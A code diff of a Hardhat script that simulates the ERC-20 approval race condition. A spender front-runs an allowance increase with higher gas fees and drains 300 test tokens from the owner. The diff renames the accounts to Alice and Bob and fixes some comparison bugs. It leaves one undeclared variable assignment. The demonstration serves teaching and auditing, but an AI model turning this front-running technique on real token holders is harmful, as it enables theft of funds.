@@ -1,13 +1,13 @@
 const { ethers } = require("hardhat");
 
 async function main() {
-    // Get signers: owner, victim, attacker
-    const [owner, victim, attacker] = await ethers.getSigners();
+    // Get signers: owner, alice, bob
+    const [owner, alice, bob] = await ethers.getSigners();
 
     console.log("===== Initializing Attack Simulation =====\n");
     console.log(`Owner Address:    ${owner.address}`);
-    console.log(`Victim Address:   ${victim.address}`);
-    console.log(`Attacker Address: ${attacker.address}\n`);
+    console.log(`Alice Address:    ${alice.address}`);
+    console.log(`Bob Address:      ${bob.address}\n`);
 
     // Deploy the CTUToken contract
     const CTUToken = await ethers.getContractFactory("CTUToken");
@@ -21,40 +21,40 @@ async function main() {
     const increasedApprovalAmount = ethers.parseUnits("200", 18);
 
     // Expected final balances
-    const expectedVictimBalance = ethers.parseUnits("0", 18); // 300 - 100 - 200 = 0
-    const expectedAttackerBalance = ethers.parseUnits("300", 18); // 0 + 100 + 200 = 300
+    const expectedAliceBalance = ethers.parseUnits("0", 18); // 300 - 100 - 200 = 0
+    const expectedBobBalance = ethers.parseUnits("300", 18); // 0 + 100 + 200 = 300
 
-    // Owner transfers 300 tokens to the victim
-    const transferTx = await ctuToken.transfer(victim.address, transferAmount);
-    const transferReceipt = await transferTx.wait();
+    // Owner transfers 300 tokens to Alice
+    const transferTx = await ctuToken.transfer(alice.address, transferAmount);
+    await transferTx.wait(); // Wait for the transaction to be mined
 
-    // Victim approves attacker to spend 100 tokens
-    const approveTx = await ctuToken.connect(victim).approve(attacker.address, approvalAmount);
-    const approveReceipt1 = await approveTx.wait();
+    // Alice approves Bob to spend 100 tokens
+    const approveTx = await ctuToken.connect(alice).approve(bob.address, approvalAmount);
+    approveReceipt1 = await approveTx.wait(); // Wait for the transaction to be mined
 
     // Display Initial State
     console.log("===== Initial State =====");
-    await displayState(ctuToken, victim, attacker);
+    await displayState(ctuToken, alice, bob);
     console.log("========================\n");
 
-    // Step 3: Victim initiates approval to increase to 200 tokens
-    console.log("=== Step 1: Victim Initiates Approval to Increase Allowance");
-    console.log("=== Victim is sending a transaction to the mempool to approve 200 CTU for the attacker.\n");
-    const approveTxIncreased = await ctuToken.connect(victim).approve(attacker.address, increasedApprovalAmount);
+    // Step 3: Alice initiates approval to increase to 200 tokens
+    console.log("=== Step 1: Alice Initiates Approval to Increase Allowance");
+    console.log("=== Alice is sending a transaction to the mempool to approve 200 CTU for Bob.\n");
+    const approveTxIncreased = await ctuToken.connect(alice).approve(bob.address, increasedApprovalAmount);
 
     // Print the state of the mempool
     await printMempool();
 
-    console.log("=== Step 2: Attacker detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
-    console.log("=== Attacker is frontrunning the transaction by setting higher fees.");
+    console.log("=== Step 2: Bob detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
+    console.log("=== Bob is frontrunning the transaction by setting higher fees.");
 
     // Increase maxFeePerGas and maxPriorityFeePerGas by 10 gwei
     const gasEstimate = await ethers.provider.getFeeData();
     const increasedMaxFeePerGas = gasEstimate.maxFeePerGas + (ethers.parseUnits('10', 'gwei'));
     const increasedMaxPriorityFeePerGas = gasEstimate.maxPriorityFeePerGas + (ethers.parseUnits('10', 'gwei'));
 
-    // Attacker sends transferFrom using the old allowance, he is frontrunning the transaction, he sets the fees higher
-    const txAttacker1 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, approvalAmount, {
+    // Bob sends transferFrom using the old allowance, he is frontrunning the transaction, he sets the fees higher
+    const txBob1 = await ctuToken.connect(bob).transferFrom(alice.address, bob.address, approvalAmount, {
         maxFeePerGas: increasedMaxFeePerGas,
         maxPriorityFeePerGas: increasedMaxPriorityFeePerGas,
     });
@@ -63,62 +63,61 @@ async function main() {
 
     // Wait until both transactions are mined
     await approveTxIncreased.wait();
-    await txAttacker1.wait();
+    await txBob1.wait();
 
-    console.log("Attacker transferred 100 CTU using the initial allowance.\n");
-    console.log("Victims transaction is mined after being frontrunned by the attacker transferFrom transaction.\n");
+    console.log("Bob transferred 100 CTU using the initial allowance.\n");
+    console.log("Alice's transaction is mined after being frontrunned by Bob's transferFrom transaction.\n");
 
-    // Display State After Victim's Approval
-    console.log("===== State After Victim's Approval =====");
-    await displayState(ctuToken, victim, attacker);
+    // Display State After Alice's Approval
+    console.log("===== State After Alice's Approval =====");
+    await displayState(ctuToken, alice, bob);
     console.log("==========================================\n");
 
-    console.log("=== Step 3: Attacker Utilizes Increased Approval");
-    console.log("=== Attacker transfers an additional 200 CTU using the increased allowance.");
+    console.log("=== Step 3: Bob Utilizes Increased Approval");
+    console.log("=== Bob transfers an additional 200 CTU using the increased allowance.");
     // Transfer the remaining 200 tokens using the increased approval
-    const txAttacker2 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, increasedApprovalAmount)
-    // Wait until the transaction is mined
-    await txAttacker2.wait();
+    const txBob2 = await ctuToken.connect(bob).transferFrom(alice.address, bob.address, increasedApprovalAmount)
+    await txBob2.wait();  // Wait until the transaction is mined
 
     // Display Final State
     console.log("===== Final State =====");
-    await displayState(ctuToken, victim, attacker);
+    await displayState(ctuToken, alice, bob);
     console.log("=======================\n");
 
     // Fetch actual final balances and allowance
-    const finalVictimBalance = await ctuToken.balanceOf(victim.address);
-    const finalAttackerBalance = await ctuToken.balanceOf(attacker.address);
-    const finalAllowance = await ctuToken.allowance(victim.address, attacker.address);
+    const finalAliceBalance = await ctuToken.balanceOf(alice.address);
+    const finalBobBalance = await ctuToken.balanceOf(bob.address);
+    const finalAllowance = await ctuToken.allowance(alice.address, bob.address);
 
     // Check if the attack was successful
-    const isAttackSuccessful = finalVictimBalance == expectedVictimBalance &&
-        finalAttackerBalance == expectedAttackerBalance &&
+    const isAttackSuccessful = finalAliceBalance == expectedAliceBalance &&
+        finalBobBalance == expectedBobBalance &&
         finalAllowance == 0;
 
     if (isAttackSuccessful) {
         console.log("===== Attack Successful =====");
         console.log("The attack has successfully exploited the approval race condition.");
-        console.log(`Final Victim Balance: ${ethers.formatUnits(finalVictimBalance, 18)} CTU`);
-        console.log(`Final Attacker Balance: ${ethers.formatUnits(finalAttackerBalance, 18)} CTU`);
-        console.log(`Final Allowance: ${ethers.formatUnits(finalAllowance, 18)} CTU\n`);
+        console.log(`Final Alice Balance: ${ethers.formatUnits(finalAliceBalance, 18)} CTU`);
+        console.log(`Final Bob Balance:   ${ethers.formatUnits(finalBobBalance, 18)} CTU`);
+        console.log(`Final Allowance:     ${ethers.formatUnits(finalAllowance, 18)} CTU\n`);
     } else {
         console.log("===== Attack Failed =====");
         console.log("The attack did not execute as expected. Details below:");
 
         // Detailed failure reasons
-        if (!finalVictimBalance == expectedVictimBalance) {
-            console.log(`- Victim's balance is ${ethers.formatUnits(finalVictimBalance, 18)} CTU, expected ${ethers.formatUnits(expectedVictimBalance, 18)} CTU.`);
+        if (finalAliceBalance != expectedAliceBalance) {
+            console.log(`- Alice's balance is ${ethers.formatUnits(finalAliceBalance, 18)} CTU, expected ${ethers.formatUnits(expectedAliceBalance, 18)} CTU.`);
         }
-        if (!finalAttackerBalance == expectedAttackerBalance) {
-            console.log(`- Attacker's balance is ${ethers.formatUnits(finalAttackerBalance, 18)} CTU, expected ${ethers.formatUnits(expectedAttackerBalance, 18)} CTU.`);
+        if (finalBobBalance != expectedBobBalance) {
+            console.log(`- Bob's balance is ${ethers.formatUnits(finalBobBalance, 18)} CTU, expected ${ethers.formatUnits(expectedBobBalance, 18)} CTU.`);
         }
-        if (!finalAllowance == 0) {
+        if (finalAllowance != 0) {
             console.log(`- Allowance is ${ethers.formatUnits(finalAllowance, 18)} CTU, expected 0 CTU.`);
         }
 
         // Additional Logs for Debugging
         console.log("\n===== Detailed Final State =====");
-        await displayState(ctuToken, victim, attacker);
+        await displayState(ctuToken, alice, bob);
         console.log("================================\n");
     }
 
@@ -129,13 +128,13 @@ async function main() {
 }
 
 // Helper function to display current state
-async function displayState(ctuToken, victim, attacker) {
-    const victimBalance = ethers.formatUnits(await ctuToken.balanceOf(victim.address), 18);
-    const attackerBalance = ethers.formatUnits(await ctuToken.balanceOf(attacker.address), 18);
-    const allowance = ethers.formatUnits(await ctuToken.allowance(victim.address, attacker.address), 18);
-    console.log(`Victim Balance:             ${victimBalance} CTU`);
-    console.log(`Attacker Balance:           ${attackerBalance} CTU`);
-    console.log(`Allowance (Victim->Attacker): ${allowance} CTU`);
+async function displayState(ctuToken, alice, bob) {
+    const aliceBalance = ethers.formatUnits(await ctuToken.balanceOf(alice.address), 18);
+    const bobBalance = ethers.formatUnits(await ctuToken.balanceOf(bob.address), 18);
+    const allowance = ethers.formatUnits(await ctuToken.allowance(alice.address, bob.address), 18);
+    console.log(`Alice Balance:               ${aliceBalance} CTU`);
+    console.log(`Bob Balance:                 ${bobBalance} CTU`);
+    console.log(`Allowance (Alice->Bob):      ${allowance} CTU`);
 }
 
 // Helper function to log transaction details
@@ -187,7 +186,7 @@ async function printLastBlockInfo() {
     console.log(`Parent Hash:      ${lastBlock.parentHash}`);
     console.log(`Timestamp:        ${new Date(lastBlock.timestamp * 1000).toLocaleString()}`);
     console.log(`Transactions:     ${lastBlock.transactions.length}`);
-    console.log(`Validator:        ${lastBlock.miner}`); // Changed from Miner to Validator
+    console.log(`Validator:        ${lastBlock.miner || lastBlock.validator}`);  // Use 'miner' or 'validator' depending on the network
     console.log(`Gas Limit:        ${ethers.formatUnits(lastBlock.gasLimit, "gwei")} GWEI`);
     console.log(`Gas Used:         ${ethers.formatUnits(lastBlock.gasUsed, "gwei")} GWEI`);
     console.log(`Base Fee Per Gas: ${ethers.formatUnits(lastBlock.baseFeePerGas, "gwei")} GWEI`);
